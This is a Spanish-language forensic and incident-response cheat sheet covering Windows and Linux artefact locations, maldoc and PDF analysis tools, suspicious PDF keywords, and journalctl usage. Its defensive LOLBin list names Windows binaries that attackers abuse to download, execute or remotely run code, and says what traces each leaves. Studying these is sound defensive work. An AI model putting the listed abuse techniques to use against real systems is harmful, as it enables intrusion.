`Archivos adjuntos Word abiertos desde Outlook`

Los archivos adjuntos tipo Word abiertos en directamente a través de en Outlook (en preview) se almacenan en esta ubicación.
```
%LocalAppdata%\Microsoft\Windows\INetCache\Content.Outlook\<Folder>\
```

### 📜 Análisis de malware en ficheros XLSX (MS Excel)

Con 7Zip podemos descomprimir el fichero .xlsx, dentro de la carpeta "XL" abrir editando el archivo llamado "workbook.xml", buscar el término **"absPath"**. Contiene la última ubicación de guardado del archivo donde veríamos al autor (C:\\<\user>\\..\\file.xlsx) que puede ser el usuario del equipo víctima.

Como técnica anti forense esta metadata se puede eliminar desde Excel "inspeccionando el documento" y borrando las "propiedades de documento e información personal".

### 📜 Análisis de malware en ficheros MS Office (oletools)

[**oletools**](https://github.com/decalage2/oletools) es un kit de herramientas python para analizar archivos Microsoft OLE2 (también llamados Structured Storage, Compound File Binary Format o Compound Document File Format), como documentos ofimáticos de Microsoft Office, mensajes de Outlook, Word, Power Point, Excel, etc. Principalmente para análisis de malware, forense y depuración. Se basa en el analizador sintáctico [olefile](https://www.decalage.info/olefile). 

> Con el argumento *-s <STREAM_NRO>* podemos ubicarnos sobre alguno de estos streams y con el argumento *-v* podemos ver el código de la macro. Podemos encontrar algunas cosas sospechosas en un archivo. Por ejemplo, las palabras claves *Create* o *CreateObject*, entre otras.

- oletools: https://github.com/decalage2/oletools
- oletools Wiki: https://github.com/decalage2/oletools/wiki
- Más info oletools: http://www.decalage.info/python/oletools

| Herramienta | Descripción |
|-------------|-------------|
| [**oledump**](https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py) | Analiza archivos OLE (Object Linking and Embedding, Compound File Binary Format). Estos archivos contienen flujos de datos. |
| [**olevba**](https://github.com/decalage2/oletools/wiki/olevba) | Dispone de la capacidad de extraer y analizar las macros VBA de los ficheros de MS Office (OLE y OpenXML). |
| [**pcodedmp**](https://github.com/bontchev/pcodedmp) | Desensamblador de p-code de VBA. |
| [**oleid**](https://github.com/decalage2/oletools/wiki/oleid) | Permite analizar ficheros OLE para detectar características que normalmente se encuentran en ficheros maliciosos. |
| [**MacroRaptor**](https://github.com/decalage2/oletools/wiki/olevba) | Sirve para detectar las Macros VBA maliciosas. |
| [**msodde**](https://github.com/decalage2/oletools/wiki/msodde) | proporciona la capacidad de detectar enlaces DDE/DDEAUTO de los ficheros de MS Office, RTF y CSV. |
| [**pyxswf**](https://github.com/decalage2/oletools/wiki/pyxswf) | Detecta, analiza y extrae los objetos Flash (SWF) que pueden estar embebidos en ficheros con formato de MS Office y RTF. |
| [**oleobj**](https://github.com/decalage2/oletools/wiki/oleobj) | Extrae los ficheros embebidos de los ficheros OLE. |
| [**rtfobj**](https://github.com/decalage2/oletools/wiki/rtfobj) | Lo mismo que el anterior pero con ficheros RTF. |
| [**olebrowse**](https://github.com/decalage2/oletools/wiki/olebrowse) | Proporciona una interfaz gráfica simple para navegar por los ficheros OLE. Este permite visualizar y extraer partes concretas del fichero. |
| [**olemeta**](https://github.com/decalage2/oletools/wiki/olemeta) | Consigue los metadatos de los ficheros OLE. |
| [**oletimes**](https://github.com/decalage2/oletools/wiki/oletimes) | Extrae las marcas de tiempo del fichero como la fecha de creación, la fecha de modificación, etc. |
| [**oledir**](https://github.com/decalage2/oletools/wiki/oledir) | Muestra todas las entradas de directorio de un archivo OLE. |
| [**olemap**](https://github.com/decalage2/oletools/wiki/olemap) | Pinta una tabla con todos los sectores, y sus atributos, del fichero OLE. |

### 📜 Herramientas de análisis en ficheros MS Office y otros (detectar malware o phising)

| Herramienta | Descripción |
|-------------|-------------|
| [**Suite de DidierStevensSuite**](https://github.com/DidierStevens/DidierStevensSuite) | Suite de [Didier Stevens](https://www.sans.org/profiles/didier-stevens). |
| [**Exiftool**](https://exiftool.org/) | Analizar los metadatos de diversos formatos de archivos. |
| [**Munpack**](https://linux.die.net/man/1/munpack) | Descomprime mensajes en formato MIME o split-uuencode. |
| [**msoffice-crypt**](https://github.com/herumi/msoffice) | Cifra/descifra ficheros MS Office. |
| [**OfficeMalScanner**](http://www.reconstructer.org/code.html) | herramienta forense de Ms Office para escanear en busca de rastros maliciosos, como shellcode heurístico, archivos PE o flujos OLE incrustados. |
| [**Hachoir-subfile**](https://hachoir.readthedocs.io/en/latest/subfile.html) | Herramienta basada en hachoir-parser para buscar subarchivos en cualquier flujo binario. |
| [**xxxswfpy**](https://hooked-on-mnemonics.blogspot.com/2011/12/xxxswfpy.html) | Escanear, comprimir, descomprimir y analizar archivos Flash SWF. |

### 📜 Herramientas de análisis PDF (detectar malware o phising)

| Herramienta | Descripción |
|-------------|-------------|
| [**PDF Stream Dumper**](http://sandsprite.com/blogs/index.php?uid=7&pid=57) | GUI de Windows para el análisis de PDF muy popular entre la comunidad de especialistas en ciberseguridad. |
| [**PDF-parser**](https://didierstevens.com/files/software/pdf-parser_V0_6_8.zip) | Extraer elementos individuales de un archivo PDF, como encabezados, enlaces y más, para su análisis detallado. |
| [**PDFID**](https://didierstevens.com/files/software/pdfid_v0_2_2.zip) | Enumera todos los objetos del archivo PDF analizado. |
| [**PEEPDF**](https://github.com/jesparza/peepdf) | Es un marco de análisis bastante poderoso que incluye búsqueda de shellcode, Javascript y más. |
| [**PDFxray**](https://github.com/9b/pdfxray_public) | Tiene la mayoría de las utilidades necesarias en forma de scripts de Python separados, pero requiere muchas dependencias. |

`¿Qué debemos buscar al analizar un documento PDF?`

Palabras clave: PDF Keywords

- **/OpenAction y /AA**: ya que pueden ejecutar scripts automáticamente.
- **/JavaScript y /JS**: respectivamente ejecutan js.
- **/GoTo**: ya que esta acción cambia la página visible del archivo, puede abrir y redirigir automáticamente a otros archivos PDF.
- **/Launch**: es capaz de iniciar un programa o abrir un documento.
- **/SubmitForm y /GoToR**: pueden enviar datos por URL.
- **/RichMedia**: se puede utilizar para incrustar flash.
- **/ObjStm**: puede ocultar objetos.
- **/URI**: accede a un recurso por su URL, quizás para phishing.
- **/XObject**: puede incrustar una imagen para realizar phishing.
- Cuidado con la ofuscación con códigos hexadecimales como */JavaScript* vs. */J#61vaScript*. https://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways.

`Comandos útiles análisis ficheros PDF`

Mostrar palabras clave riesgosas presentes en el archivo archivo.pdf.
```
pdfid.py file.pdf -n
```

Mostrar estadísticas sobre palabras clave. Agregue "-O" para incluir secuencias de objetos.
```
pdf-parser.py file.pdf -a:
```

Mostrar el contenido del ID del objeto. Agregue "-d" para volcar la secuencia del objeto..
```
pdf-parser.py file.pdf -o id
```

Mostrar objetos que hacen referencia al ID del objeto.
```
pdf-parser.py file.pdf -r id
```

Descifrar infile.pdf usando la contraseña para crear outfile.pdf.
```
qpdf --password=pass --decrypt infile.pdf outfile.pdf
```

### 📜 Identificar Shellcodes en ficheros y otros comandos de análisis

| Herramienta | Descripción | Ejemplo uso |
|-------------|-------------|-------------|
| [xorsearch](https://blog.didierstevens.com/2014/09/29/update-xorsearch-with-shellcode-detector/) | Localiza los patrones de shellcode dentro del archivo binario file.bin. | xorsearch -W -d 3 file.bin |
| [scdbgc](http://sandsprite.com/blogs/index.php?uid=7&pid=152) | Emula la ejecución de shellcode en file.bin. Con el parámetro "/off" se especifica el desplazamiento. | scdbgc /f file.bin |
| [runsc32](https://github.com/edygert/runsc) | Ejecuta shellcode en file.bin para observar el comportamiento en un laboratorio aislado. | runsc32 -f file.bin-n |
| [base64dump.py](https://blog.didierstevens.com/2017/07/02/update-base64dump-py-version-0-0-7/) | Enumera las cadenas codificadas en Base64 presentes en el archivo file.txt. | base64dump.py file.txt |
| [numbers-to-string.py](https://videos.didierstevens.com/2016/10/11/maldoc-numbers-to-string-py/) | Convierte números que representan caracteres en un archivo en una cadena. | numbers-to-string.py file |

### 📜 Detectar URL maliciosas en el documento

Para buscar la existencia de estas URL, abrimos el documento con la herramienta 7zip y vamos a ir extrayendo los archivos que contiene. Partimos por extraer archivos como "**document.xml.res**" o "**webSettings.xml.res**" buscando tags o atributos como: **sourceFileName**, **attachedTemplate**, **Target**, **TargetMode**.

También buscamos alguna URL que sea distinta a las oficiales de Microsoft. Ejemplo de URL oficiales pueden ser http://schemas.openxmlformats.org/, http://schemas.microsoft.com/

### 📜 Asignación de IPs en equipos

En un incidente se descubre que se envió un paquete de red mal formado desde una dirección IP, pero el atacante elimina dicho registro. Se puede consultar la siguiente subclave del registro para encontrar el equipo en la red que tenía esa dirección IP. Cada subclave tendrá un registro DHCP con los valores DhcpIPAddress, DhcpNameServer, etc.
```
HKLM\SYSTEM\ControlSet00*\Services\Tcpip\Parameters\Interfaces
```

### 📜 Windows Firewall (wf.msc): Reglas residuales de software desintalado

Comprobar las reglas de entrada y salida en Windows Firewall **"wf.msc"**. Un actor malicioso podría haber instalado software que creó reglas de firewall. La mayoría de las aplicaciones no borran estas reglas, incluso cuando se desinstala.

### 📜 Persistencia: suplantación de procesos del sistema

Detección de 2 procesos con el mismo PID pero diferentes direcciones de memoria, podría indicar un proceso de inyección malicioso. 

Algunos ejemplos en procesos conocidos.
| Process      | PID  | Address  |
|--------------|------|----------|
| explorer.exe | 547  | 0xa20000 |
| explorer.exe | 547  | 0x5d1000 |
| svchost.exe  | 1447 | 0x6d0000 |
| svchost.exe  | 1447 | 0x210000 |
| rundll32.exe | 5287 | 0xa90000 |
| rundll32.exe | 5287 | 0x6a1000 |

### 📜 Herramientas para consultar y auditar: GPOs, control de accesos, usuarios, grupos y otros funciones de Active Directory y LDAP

La forma más limpia y sencilla de **realizar un backup o export de las políticas locales** (GPOs locales) de un equipo.

Copiar todos los ficheros de la siguiente ruta:
```
%systemroot%\System32\GroupPolicy
```
Una vez los tengamos aislados poder reemplazarlo en una nueva imagen de sistema limpia o simplemente analizarlos con la utilidad de Registry.pol Viewer Utility. 

| Herramienta | Info | Link |
|-------------|------|------|
| `Registry.pol Viewer Utility` (sdmsoftware) | Visualizar *Registry.pol* de GPOs | https://sdmsoftware.com/389932-gpo-freeware-downloads/registry-pol-viewer-utility |
| `Nettools` | Consultar múltiples funciones de AD | https://nettools.net/download |
| `Ping Castle` | Auditoría de seguridad general del estado de AD. Útil para analizar herencias o nuevas membresías a grupos privilegiados | https://pingcastle.com/download |

### 📜 Análisis de phishing mails (extensión .eml) 

- SysTools EML Viewer Tool: https://www.systoolsgroup.com/eml-viewer.html

### 📜 MUICache: artefactos sobre aplicaciones
MUICache es un recurso de Windows que actúa como una clave de registro que se encarga de almacenar información sobre el ejecutable de cada aplicación y que el sistema operativo extrae automáticamente cuando se utiliza una nueva aplicación. MUICache tiene la característica de que incluso si eliminas algunos elementos, volverán a aparecer la próxima vez que ejecutes esa aplicación.

```
HKEY_USERS\<SID_USER>\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache
HKEY_USERS\<SID_USER>_Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache
```

- Tool GUI - MUICacheView: https://www.nirsoft.net/utils/muicache_view.html

### 📜 FeatureUsage: reconstruir las actividades de los usuarios
Realiza un seguimiento de los eventos asociados con la barra de tareas, por ejemplo, cuando un usuario ejecuta una aplicación anclada a ella. Los artefactos *FeatureUsage* se encuentran en el archivo de registro NTUSER.DAT con la siguiente clave.

```
HKEY_USERS\<SID_USER>\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage
```

- **AppBadge**: Esta subclave realiza un seguimiento de las actualizaciones de credenciales para aplicaciones en la barra de tareas. Por ejemplo, si se usa Telegram, WhatsApp, Discord y se recibe un mensaje nuevo, puede ver un ícono rojo en la insignia de la aplicación con la cantidad de mensajes nuevos.
- **AppLaunch**: Esta subclave registra los inicios de aplicaciones, que están ancladas a la barra de tareas
AppSwitched: Esta subclave registra los clics izquierdos en las aplicaciones de la barra de tareas cuando un usuario desea cambiar de una a otra.
- **ShowJumpView**: Esta subclave rastrea los clics derechos en las aplicaciones de la barra de tareas.
- **TrayButtonClicked**: Esta subclave rastrea los clics izquierdos en los siguientes elementos de la barra de tareas: botón Reloj, botón Inicio, botón Centro de notificaciones y cuadro de búsqueda, pudiendo ver los clics en cada elemento.

### 📜 MRU (Most Recently Used): Artefactos de Office local y Office 365
**MRU** (Most Recently Used o Usado más recientemente): muestran a través del registro de Windows la lista de archivos abiertos recientemente por el usuario usados en las aplicaciones de Office, facilitando al usuario el poder elegir de esta lista en lugar de navegar a la carpeta origen donde está ubicado. 

- En una investigación general, conocer qué documentos abrió recientemente el usuario puede revelar para qué se utilizó el equipo afectado.
- Enumerar las rutas y los timestamps de los archivos que se eliminaron desde entonces o que estaban en una unidad extraíble.
- En un caso de intrusión con una cuenta de usuario corporativa al equipo a un aplicativo de office 365 en cloud, esta lista podría mostrar qué documentos podrían ser de interés para el atacante.
- En el caso de un ataque de phishing local con documento adjunto, se podría ver y confirmar los timestamps y la ejecución del documento malicioso por parte del usuario víctima.
- En un caso de amenaza interna, puede mostrar qué tipo de documentos quería robar o exfiltrar el insider. 

Para documentos Office abiertos desde una sesión iniciada de Office 365 con una cuenta sincronizada y licenciada de Microsoft Live. Un ejemplo con Excel y Word.
```
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\User MRU\LiveId_<ID>\File MRU
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\User MRU\LiveId_<ID>\File MRU
```

Los documentos de Office abiertos en local no llevan la ruta de identificador de sincronización de LiveId. Un ejemplo con Word.
```
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\File MRU
HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Word\Reading Locations\Document X
```

- Tool GUI - RecentFilesView: https://www.nirsoft.net/utils/recent_files_view.html

### 📜 Ver el úlimo fichero descomprimido 7-Zip
La siguiente ruta muestra la ruta y confirma el último fichero descomprimido usando 7-Zip. 

Si en una investigación forense se sospecha de que el origen de ejecución de un fichero malioso se escondía detrás de otro fichero comprimido enviado vía correo, descargado y descomprimido en local, podemos utilizar esta info como artefacto de confirmación e indicativo de la acción en el equipo ejecutado por parte del usuario víctima.

```
HKEY_USERS\<SID_USER>\Software\7-Zip\FM
```
- Valor **PanelPath0**: Este valor muestra la ruta del último fichero descomprimido usando 7-Zip.

### 📜 Detectar antimalware instalado y su estado usando WMI
Listará los agentes de antimalware instalados en el sistema.

```ps
Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Select-Object displayName, productState, pathToSignedReportingExe, timestamp | fl
```

### 📜 Detectar servicios configurados con cuentas de dominio
*DOMAIN* = Sustituir por el FQDN correspondiente.

```ps
Get-WmiObject Win32_Service | Where-Object { $_.StartName -like "*DOMAIN*" } | Select-Object Name, StartName
```

### 📜 LOLBins comunes y sus artefactos

**LOLBins** (Living Off the Land Binaries) son principalmente ficheros ejecutables, scripts o librerías legítimas que ya están presentes en un sistema operativo y que los atacantes pueden llegar a utilizar con fines maliciosos para los que originalmente no fueron diseñados para esos usos. 

Estos programas no requieren la instalación de software adicional, lo que permite a los atacantes realizar acciones maliciosas de forma desapercibida puediendo evitar la detección por parte de soluciones de seguridad tradicionales y para los equipos de monitorización y detección si no están lo suficientemente preparados.

Los LOLBins suelen usasarse después de conseguir un acceso inicial a un sistema, normalmente en fases de post-explotación para conseguir una escalada de privilegios (descarga o ejecución arbitraria de otros ficheros o código) debido a otras debilidades adyacentes de configuración en el sistema o también como técnicas de exfiltración de datos. Es muy común ver el uso de más de algún LOLBin como parte de ataques [APT (Advanced Persistent Threat)](https://es.wikipedia.org/wiki/Amenaza_persistente_avanzada) usados por grupos conocidos de ciberdelincuentes que puedan desencadenar una potencial afectación de Ransomware.

Existen multitud de LOLBins tanto para sistemas Windows [LOLBAS](https://lolbas-project.github.io/) como para sistemas basados en el kernel de Linux [GTFOBins](https://gtfobins.github.io/), algunos también afectarían a sistemas MacOS ya que es un derivado de UNIX.

> Los siguientes LOLBins afectan a sistemas Windows siendo **los "LOLBins TOP" más utilizados** y detectados según las estadísticas de los fabricantes de plataformas EDR/XDR en los reportes de incidentes críticos de seguridad en las compañías privadas y administraciones públicas.

Listado de mayor a menor uso:

**`PowerShell.exe`**: Intérprete de línea de comandos y lenguaje de scripting en Windows, utilizado en estos casos para ejecutar scripts maliciosos y comandos.

**`rundll32.exe`**: Utilidad de Windows que carga y ejecuta funciones desde bibliotecas DLL.

**`te.exe`**: Parte del Test Authoring and Execution Framework.

**`PsExec.exe`**: Forma parte de la [suite de Sysinternals](https://learn.microsoft.com/es-es/sysinternals/downloads/psexec), es una herramienta para ejecutar procesos en sistemas remotos.

**`CertUtil.exe`**: Herramienta para gestionar información de las autoridades de certificación.

**Artefactos CertUtil**: 
- <u>Artefactos de proceso</u>: Eventos de creación de procesos (4688) en el registro de eventos de seguridad.
- <u>Archivos CryptNetURLCache</u>: Rutas donde se guarda la caché guarda una copia de los archivos descargado, metadatos sobre el lugar desde el que se descargó el archivo y la hora de la primera y la última descarga.

***Evidencias para descargas existosas:***

Contiene copias de cualquier archivo descargado por certutil.
```
C:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache
C:\Windows\SysWOW64\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache
C:\Users\<USERNAME>\AppData\LocalLow\Microsoft\CryptnetUrlCache
```

Metadata en archivos CryptNetURLCache: Contiene un archivo con información sobre la descarga, como la URL y la fecha.
```
C:\Users\<USERNAME>\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
C:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
C:\Windows\SysWOW64\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
```

***Evidencias para descargas fallidas:***

Buscar el registro de Windows en los eventos de Windows Defender el ID 1116 que indica un evento de detección de malware u otro software potencialmente no deseado. Esta actividad está bloqueada de manera predeterminada si RTP (Real Time Protection) está habilitado.

Referencias:
- Artículo de AbdulRhman Alfaifi sobre como [analizar los archivos de metadatos de certutil](https://u0041.co/posts/articals/certutil-artifacts-analysis/) 
- [CryptnetURLCacheParser](https://u0041.co/posts/articals/certutil-artifacts-analysis/): Herramienta de AbdulRhman Alfaifi para analizar archivos de caché CryptAPI sobre certutil

**`Reg.exe`**: Herramienta para la gestión del registro de Windows desde línea de comandos.

**`wscript.exe`**: Windows Script Host, diseñado para ejecutar scripts en lenguajes de programación.

> **Los siguientes LOLBins también se detectaron aunque en un menor porcentaje de uso** por los sistemas EDR/XDR en los reportes de incidentes críticos de seguridad en las compañías privadas y administraciones públicas.

**`mshta.exe`**: Diseñado para ejecutar archivos de aplicaciones HTML de Microsoft (HTA), puede ejecutar código de Windows Script Host (VBScript y JScript) incrustado en HTML.

**`msiexec.exe`**: Instalador de Windows que puede ser utilizado para ejecutar archivos MSI maliciosos.

**`cscript.exe`**: Intérprete de scripts de Windows que permite la ejecución de scripts VBScript y JScript.

**`netsh.exe`**: Herramienta de configuración de red de Windows que puede ser utilizada para modificar configuraciones de red y establecer túneles.

**`schtasks.exe`**: Utilidad para programar tareas en Windows que puede ser usada para establecer tareas persistentes o maliciosas.

**`excel.exe`**: Aplicación de Microsoft Excel que puede ejecutar macros maliciosas embebidas en documentos.

**`print.exe`**: Comando para gestionar trabajos de impresión, potencialmente explotable para manipular colas de impresión.

**`msbuild.exe`**: Herramienta de compilación de Microsoft que puede compilar y ejecutar código malicioso.

**`powerpnt.exe`**: Aplicación de Microsoft PowerPoint que puede ejecutar macros maliciosas en presentaciones.

**`regsvr32.exe`**: Utilidad para registrar y anular el registro de objetos COM que puede ejecutar scripts maliciosos desde internet.

**`winword.exe`**: Aplicación de Microsoft Word que puede ejecutar macros maliciosas embebidas en documentos.

**`shell32.exe`**: Biblioteca de Windows que contiene funciones usadas para abrir programas y archivos, susceptible a ser explotada para ejecutar comandos arbitrarios.

## 📁 Linux

### 📜 Logs del sistema de Linux

Estos ficheros de logs pueden variar, existir o no dependiendo del tipo de distribución del sistema Linux.

| File Path | Info |
|-----------|------|
| `/var/log/syslog` | Contiene la totalidad de logs capturados por rsyslogd. Los mensajes globales del sistema incluyendo registros que generan algunos servicios durante el arranque, registros que dejan los programas que se ejecutan por parte del demonio CROND, logs sobre procesos de autenticación llevados a cabo por los usuarios, etc. |
| `/etc/passwd` | Contiene información sobre cuentas de usuario. |
| `/etc/shadow` | Contiene información sobre hashes de contraseñas de las cuentas de usuario. |
| `/etc/group` | Contiene información sobre grupos y miembros de grupos. |
| `/var/log/auth.log` (Debian y derivados) ; `/var/log/secure` (Red Hat y derivados) | Almacena los eventos relacionados con mecanismos de autenticación, por ejemplo, cuando un usuario inicia sesión en el sistema, cambios en contraseñas, relacionados con sudo. |
| `/var/log/audit/audit.log` | Los sistemas que utilizan auditd, este registro contiene eventos de seguridad detallados. |
| `var/log/debug` |	Registra datos de los programas que están actuando en modo depuración. De esta forma los programadores pueden obtener información si sus programas están funcionando adecuadamente. |
| `/var/log/kern.log` | Este fichero almacena los logs producidos por el kernel. Puede ser útil para intentar detectar y solucionar problemas con la detección de hardware. |
| `/proc/...` | Contiene información información del kernel, hardware, procesos en tiempo real y en general de características y estado del sistema. |
| `/var/log/dmesg` | Registra información relacionada con el hardware del equipo. Contiene información para concluir si el hardware funciona de forma adecuada. |
| `/var/log/dpkg.log` | En sistemas basados en Debian se genera este fichero cuando se instala o desinstala software utilizando DPKG. Contiene los registros y eventos producidos durante el proceso de instalación. |
| `/var/log/messages` | Contiene mensajes informativos y no críticos de la actividad del sistema operativo. Acostumbra a contener los errores que se registran en el arranque del sistema que no estén relacionados con el Kernel. Por lo tanto, si no se inicia un servicio, como por ejemplo el servidor de sonido, podemos buscar información dentro de este archivo. |
| `/var/log/faillog` | Registra los intentos fallidos de autenticación de cada usuario. Dentro del archivo se almacena una lista de usuarios, los fallos totales de cada usuario, el número de fallo máximos que permitimos y la fecha y hora del último fallo. Si un usuario supera el número de fallos máximos establecidos se deshabilitará el usuario por el tiempo que nosotros fijemos. |
| `/var/spool/cron` | Archivos crontab para las tareas programadas creadas por todos los usuarios del sistema. |
| `/etc/crontab` | Archivo crontab para el usuario root a nivel general del sistema. |
| `/etc/hosts` | Analizar el archivo hosts en busca de posibles manipulaciones de direcciones IP y resolución de nombres. |
| `/var/log/user.log` | Incluye información sobre los eventos producidos en las sesiones de los usuarios, dichos eventos incluyen errores, conexiones e interfaces de red que se encuentran activas. |
| `/var/log/lastlog` | Ayuda a ver la fecha y la hora en que cada usuario se ha conectado por última vez. |
| `/tmp` o `/var/tmp` | Archivos temporales que puedan contener información relevante en un análisis DFIR. |
| `/var/log/btmp` | Este fichero incluye registros sobre los intentos de autenticación fallido en el sistema. Almacena los intentos fallidos de logins en un equipo. Si alguien realizará un ataque de fuerza bruta a un servidor ssh, el fichero registraría la IP del atacante, el día y hora en que ha fallado el login, el nombre de usuario con que se ha intentado loguear, etc. Para visualizar este fichero usar utmpdump: "utmpdump /var/log/btmp"|
| `/var/log/wtmp` | Contiene información sobre qué usuarios se encuentran autenticados y usando el sistema actualmente. Equivalente al comando "last"|
| `/var/run/utmp` | Ver los usuarios que actualmente están logueados en un equipo. |
| `/var/log/boot.log` | Información relacionada con el arranque del sistema. Podemos consultarlo para analizar si se levantan los servicios del sistema, si se levanta la red, si se montan las unidades de almacenamiento, para averiguar un problema que hace que nuestro equipo no inicie, etc. |
| `/var/log/cron` | Se trata de un fichero de logs en donde se guardan los registros producidas por las tareas programadas ejecutadas por el demonio CROND. |
| `/var/log/daemon.log`	| Registra la actividad de los demonios o programas que corren en segundo plano. Para ver si un demonio se levanto o está dando errores podemos consultar este log. Dentro de daemon.log encontraremos información sobre el demonio que inicia el gestor de inicio, el demonio que inicia la base de datos de MySQL, etc. |
| `/var/log/apt/history.log` | Detalle de los paquetes instalados, desinstalados o actualizados mediante el gestor de paquetes apt. |
| `/var/log/apt/term.log` | Contiene la totalidad de información mostrada en la terminal en el momento de instalar, actualizar o desinstalar un paquete con apt. |
| `/var/log/mail.log` |	Información relacionada con el servidor de email que tengamos instalado en el equipo. En mi caso uso sendmail y registra la totalidad de sus acciones en mail.log. |
| `/var/log/alternatives.log` | Registra todas las operaciones relacionadas con el sistema de alternativas. Por lo tanto, todas las acciones que realicemos usando el comando update-alternatives se registrarán en este log. El sistema de alternativas permite definir nuestro editor de texto predeterminado, el entorno de escritorio predeterminado, la versión de java que queremos usar por defecto, etc. |
| `/var/log/Xorg.0.log` | Registra la totalidad de eventos relacionados con nuestra tarjeta gráfica desde que arrancamos el ordenador hasta que lo apagamos. Por lo tanto puede ayudar a detectar problemas con nuestra tarjeta gráfica. |

### 📜 Logs de aplicaciones de Linux

| File Path | Info |
|-----------|------|
| `/var/log/mysqld.log` | Registra eventos y mensajes relacionados con el sistema de gestión de bases de datos MySQL. Contiene información sobre el inicio y apagado del servidor MySQL, consultas ejecutadas, errores y advertencias, así como cualquier actividad relevante en la base de datos. |
| `/var/log/rkhunter.log` | Registra la totalidad de resultados obtenidos por rkhunter. |
| `/var/log/samba/*.*` | Dentro de la ubicación "/var/log/samba" se encuentran distintos logs que registrarán los eventos que han ocurrido en nuestro servidor samba. Algunos de los registros que encontrarán son sobre creaciones de directorios, renombrado de archivos, ficheros creados y borrados, registros de conexiones y desconexiones al servidor, etc. |
| `/var/log/cups/*.*` | **"error_log"**, **"page_log"** y **"access_log"** contienen información acerca las horas en que una IP se ha conectado al servidor, el usuario que se ha conectado al servidor, los errores y advertencias del servidor, la fecha en que se ha imprimido un determinado documento, el número de copias, etc. |
| `/var/log/lighttpd/*.*` | **"access.log"** y **"error.log"** contienen información sobre las visitas y errores que se generan cuando un usuario visita una página web montada sobre un servidor lighttpd. |
| `/var/log/apache2/access.log` o `/var/log/httpd/access_log` | Contiene información de los usuarios que han accedido al servidor web Apache. En este fichero se encuentran datos como las webs que se han visitado desde una determinada IP, la hora en que una IP nos ha visitado, etc. |
| `/var/log/apache2/error.log` o `/var/log/httpd/error_log` | Registra la totalidad de errores cuando se procesan las solicitudes de los visitantes al servidor web Apache. |
| `/var/log/nginx/access.log` `/var/log/nginx/error.log` | **"access.log":** Registra las solicitudes al servidor Nginx, incluyendo detalles sobre la solicitud, dirección IP y código de respuesta HTTP, user-agent del cliente y más. **"error.log":** Registra los errores en el servidor Nginx, como problemas de configuración, errores de conexión y otros fallos técnicos. |
| `/var/log/prelink/` |	Contiene información sobre las modificaciones que la utilidad prelink realiza a los binarios y librerías compartidas. |
| `/var/log/mysql/mysql.log` | Registra la totalidad de sentencias que los clientes envían al servidor. |
| `/var/log/mysql/error.log` | Registra los errores o problemas detectados al iniciar, ejecutar o parar el servicio. Por lo tanto en el caso que MySQL o MariaDB no se inicien deberemos acceder a este fichero para obtener información del problema. |
| `/var/log/mysql/mysql-slow.log` |	Encontraremos información acerca de las sentencias que han tardado más segundos que los especificados en la variable del sistema long_query_time. De esta forma podremos conocer la sentencias SQL que se ejecutan de forma lenta. |
| `/var/log/fail2ban.log` | Registra el timestamp en el que una determinada IP ha sido bloqueada y desbloqueada al intentar acceder a un determinado servicio, normalmente SSH. |
| `/var/log/openvpn.log` | La hora en la que una determinada IP se ha conectado al servidor OpenVPN. Aunque para registrar los intentos fallidos de autenticación también se podría hacer uso de fail2ban. |
| `/var/log/openvpn-status.log` | Contiene información de los usuarios conectados al servidor OpenVPN. Ejemplos de la información que contiene es la IP de cada uno de los usuarios, la cuenta de usuario con que se ha conectado una determinada IP, la hora en que cada usuario ha iniciado la conexión, etc. |
| `/var/log/letsencrypt/letsencrypt.log` | Contiene todo tipo de información acerca de los certificados de Let's Encrypt. Por ejemplo si se han producido errores en la renovación de los certificados. |

### 📜 Logs journalctl (systemd)
**Systemd**: es un sistema moderno en Linux que reemplaza a SysV init, mejorando la eficiencia del inicio y administración de servicios. SysV representa tanto al sistema operativo Unix System V como a un estilo de inicio basado en scripts de inicialización tradicionales, "init.d" gestiona servicios en sistemas con este enfoque. Systemd introduce herramientas como "journalctl", permitiendo acceder y analizar eficientemente registros estructurados del sistema.

**Journalctl**: es una herramienta en Linux que trabaja con el registro de systemd, brindando acceso a registros estructurados en el Journal de systemd. Facilita consultas y análisis avanzados de eventos del sistema mediante registros binarios estructurados, en contraste con los registros de texto plano tradicionales.

Configurar la hora del sistema para visualizar los registros en hora UTC o local systemd mostrará los resultados en hora local de manera predeterminada.
```bash
timedatectl list-timezones
timedatectl set-timezone <zone>
timedatectl status
```

Filtrar por prioridad.
```bash
Journalctl -p <n>
# 0: emerg
# 1: alert
# 2: crit
# 3: err
# 4: warning
# 5: notice
# 6: info
# 7: debug
```

Filtrar por fecha/hora y rangos.
```bash
journalctl --since "YYYY-MM-DD"
journalctl --since "YYYY-MM-DD HH:MM:SS"
journalctl --since "-5 day"
journalctl --until "YYYY-MM-DD"
journalctl --since "YYYY-MM-DD HH:MM:SS" --until "YYYY-MM-DD HH:MM:SS"
```

Mostrar las 20 entradas más recientes.
```bash
journalctl -n 20
```

Hacer un seguimiento de los registros a tiempo real (equivalente a tail -f).
```bash
journalctl -f # Equivalente a "journalctl" y después presionar "Shift+F".
```

Mostrar la lista de todos los boots que existen en el sistema.
```bash
journalctl --list-boots
```

Mostrar resgistros de kernel.
```bash
journalctl -k
```

Mostrar los registros de la sesión de inicio anterior para rastrear eventos previos al reinicio del sistema.
```bash
journalctl -b -1
```

Mostrar los servicios que son dependientes del systemd.
```bash
systemctl list-units -t service --all
```

Filtrar por servicios.
```bash
journalctl -u sshd.service
journalctl -u sshd.service -u dbus.service
journalctl -u sshd.service --since today
```

Cambiar el formato en los resultados de salida.
```bash
journalctl -b -u nginx -o json
journalctl -b -u nginx -o json-pretty
journalctl -b -u nginx -o short # Resultado similar a un estilo syslog.
```

